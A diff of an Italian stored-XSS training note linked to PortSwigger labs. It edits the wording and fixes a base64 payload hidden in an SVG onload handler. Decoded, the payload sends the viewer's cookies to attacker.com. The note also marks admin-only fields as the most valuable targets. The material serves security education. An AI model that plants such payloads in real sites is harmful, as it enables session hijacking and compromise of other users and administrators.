@@ -1,15 +1,15 @@
 # Stored XSS
 
-**Difficolta:** Intermediate
+**Difficoltà:** Intermediate
 **Time to Master:** 1.5h
 **Prerequisiti:** [02-Reflected-XSS.md](02-Reflected-XSS.md)
-**Lab:** PortSwigger Academy — Stored XSS
+**Lab:** PortSwigger Academy, Stored XSS
 
 ---
 
 ## Obiettivo
 
-Sfruttare campi che salvano input nel database (commenti, profili, recensioni, ticket di supporto) per eseguire JS contro chiunque visualizzi il contenuto — impatto molto maggiore della reflected, colpisce piu vittime senza bisogno di link diretti.
+Con la reflected devi convincere qualcuno a cliccare un link; con la stored il lavoro sporco lo fa l'applicazione al posto tuo, mostrando il tuo payload a chiunque visiti quella pagina. Qui vedi come sfruttare campi che salvano input nel database (commenti, profili, recensioni, ticket di supporto) per eseguire JS contro chiunque visualizzi il contenuto: impatto molto maggiore della reflected, e colpisce più vittime senza bisogno di link diretti.
 
 ---
 
@@ -25,7 +25,7 @@ Sfruttare campi che salvano input nel database (commenti, profili, recensioni, t
 | Nome file caricato | admin panel di gestione upload |
 | User-Agent/Referer loggati | dashboard di analytics interna |
 
-**Nota:** i campi visti solo dall'admin (es. ticket, log) sono i piu preziosi: XSS li che colpisce l'admin puo portare a compromissione completa del pannello.
+**Nota:** i campi visti solo dall'admin (es. ticket, log) sono il bersaglio più prezioso che troverai: pochi sviluppatori pensano a sanitizzare "tanto lo vede solo l'admin", ed è esattamente lì che uno XSS può portare a compromissione completa del pannello.
 
 ---
 
@@ -64,7 +64,7 @@ Inserito ad esempio nel campo "nome" di un ordine/richiesta di supporto: quando 
 ### Esempio 3: bypass filtro lunghezza campo con payload compatto
 
 ```html
-<svg/onload=eval(atob('ZmV0Y2goJ2h0dHA6Ly9hdHRhY2tlci5jb20vYz9jPScrZG9jdW1lbnQuY29va2ll'))>
+<svg/onload=eval(atob('ZmV0Y2goJ2h0dHA6Ly9hdHRhY2tlci5jb20vYz9jPScrZG9jdW1lbnQuY29va2llKQ=='))>
 ```
 
 **Spiegazione:** payload lungo codificato in base64 dentro un `eval(atob(...))` breve, utile quando il campo ha un limite di caratteri stretto.
@@ -73,13 +73,13 @@ Inserito ad esempio nel campo "nome" di un ordine/richiesta di supporto: quando 
 
 ## Evasion / Bypass Techniques
 
-Vedi [06-WAF-Evasion.md](06-WAF-Evasion.md) per bypass generali; per stored XSS in particolare, verifica sempre se la sanitizzazione avviene solo in input (al salvataggio) o anche in output (alla visualizzazione) — a volte solo una delle due e implementata.
+Vedi [06-WAF-Evasion.md](06-WAF-Evasion.md) per bypass generali; per stored XSS in particolare, verifica sempre se la sanitizzazione avviene solo in input (al salvataggio) o anche in output (alla visualizzazione): a volte solo una delle due è implementata.
 
 ---
 
 ## Lab Hands-On
 
-### Lab 1: PortSwigger — Stored XSS into HTML context with nothing encoded
+### Lab 1: PortSwigger, Stored XSS into HTML context with nothing encoded
 **Obiettivo:** eseguire XSS persistente in una recensione prodotto
 **Difficulty:** Facile
 **Time:** 20 min
@@ -93,14 +93,14 @@ Vedi [06-WAF-Evasion.md](06-WAF-Evasion.md) per bypass generali; per stored XSS 
 
 ## Common Mistakes
 
-- Testare solo con la propria sessione -> devi confermare che il payload esegua anche per ALTRI utenti che visualizzano il contenuto
-- Ignorare i campi "invisibili" (visti solo dall'admin) -> spesso i piu vulnerabili perche meno testati dagli sviluppatori
+- Testare solo con la propria sessione -> non hai dimostrato nulla finché non confermi che il payload esegue anche per ALTRI utenti che visualizzano il contenuto
+- Ignorare i campi "invisibili" (visti solo dall'admin) -> sono spesso i più vulnerabili, proprio perché meno testati dagli sviluppatori
 
 ---
 
 ## Link Utili
 
-- [PortSwigger — Stored XSS](https://portswigger.net/web-security/cross-site-scripting/stored)
+- [PortSwigger: Stored XSS](https://portswigger.net/web-security/cross-site-scripting/stored)
 
 ---
 
@@ -118,8 +118,3 @@ Vedi [06-WAF-Evasion.md](06-WAF-Evasion.md) per bypass generali; per stored XSS 
 - [ ] So confermare esecuzione con sessione/utente separato
 - [ ] So identificare campi "solo-admin" ad alto impatto
 
----
-
-## Note personali
-
-_(spazio libero)_
